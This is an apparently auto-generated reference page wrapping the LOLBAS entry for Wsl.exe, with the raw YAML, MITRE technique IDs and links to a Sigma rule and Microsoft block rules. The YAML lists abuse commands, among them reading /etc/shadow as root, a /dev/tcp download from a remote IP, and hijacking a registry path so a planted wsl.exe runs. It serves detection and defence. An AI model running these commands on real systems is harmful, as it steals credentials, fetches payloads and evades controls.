---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Wsl.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `wsl.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Wsl.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Wsl.exe](../../tools/windows/wsl.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | wsl.exe |
| name | Wsl.exe |
| type | tool |
| source | lolbas |
| url | https://cardinalops.com/blog/bash-and-switch-hijacking-via-windows-subsystem-for-linux/ |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@aionescu'
  Person: Alex Ionescu
- Handle: '@NotoriousRebel1'
  Person: Matt
- Handle: '@d1r4c'
  Person: Asif Matadar
- Handle: '@nas_bench'
  Person: Nasreddine Bencherchali
- Person: Konrad 'unrooted' Klawikowski
- Person: Liran Ravich, CardinalOps
Author: Matthew Brown
Commands:
- Category: Execute
  Command: wsl.exe -e /mnt/c/Windows/System32/calc.exe
  Description: Executes calc.exe from wsl.exe
  MitreID: T1202
  OperatingSystem: Windows 10, Windows Server 2019, Windows 11
  Privileges: User
  Tags:
  - Execute: EXE
  Usecase: Performs execution of specified file, can be used to execute arbitrary Linux commands.
- Category: Execute
  Command: wsl.exe -u root -e cat /etc/shadow
  Description: Cats /etc/shadow file as root
  MitreID: T1202
  OperatingSystem: Windows 10, Windows Server 2019, Windows 11
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Performs execution of arbitrary Linux commands as root without need for password.
- Category: Execute
  Command: wsl.exe --exec bash -c "{CMD}"
  Description: Executes Linux command (for example via bash) as the default user (unless stated otherwise using `-u <username>`)
    on the default WSL distro (unless stated otherwise using `-d <distro name>`)
  MitreID: T1202
  OperatingSystem: Windows 10, Windows Server 2019, Windows 11
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Performs execution of arbitrary Linux commands.
- Category: Download
  Command: wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
  Description: Downloads file from 192.168.1.10
  MitreID: T1105
  OperatingSystem: Windows 10, Windows Server 2019, Windows 11
  Privileges: User
  Usecase: Download file
- Category: Execute
  Command: wsl.exe
  Description: When executed, `wsl.exe` queries the registry value of `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\MSI\InstallLocation`,
    which contains a folder path (`c:\program files\wsl` by default). If the value points to another folder containing a file
    named `wsl.exe`, it will be executed instead of the legitimate `wsl.exe` in the program files folder.
  MitreID: T1218
  OperatingSystem: Windows 10, Windows Server 2019, Windows 11
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Execute a payload as a child process of `bash.exe` while masquerading as WSL.
Created: 2019-06-27
Description: Windows subsystem for Linux executable
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_wsl_lolbin_execution.yml
- BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
- IOC: Child process from wsl.exe
Full_Path:
- Path: C:\Windows\System32\wsl.exe
Name: Wsl.exe
Resources:
- Link: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
- Link: https://twitter.com/nas_bench/status/1535431474429808642
- Link: https://cardinalops.com/blog/bash-and-switch-hijacking-via-windows-subsystem-for-linux/
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Wsl.yml
```

## Detection / Analysis Notes

```text
BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
```

```text
IOC: Child process from wsl.exe
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_wsl_lolbin_execution.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_wsl_lolbin_execution.yml
- BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
- IOC: Child process from wsl.exe
```
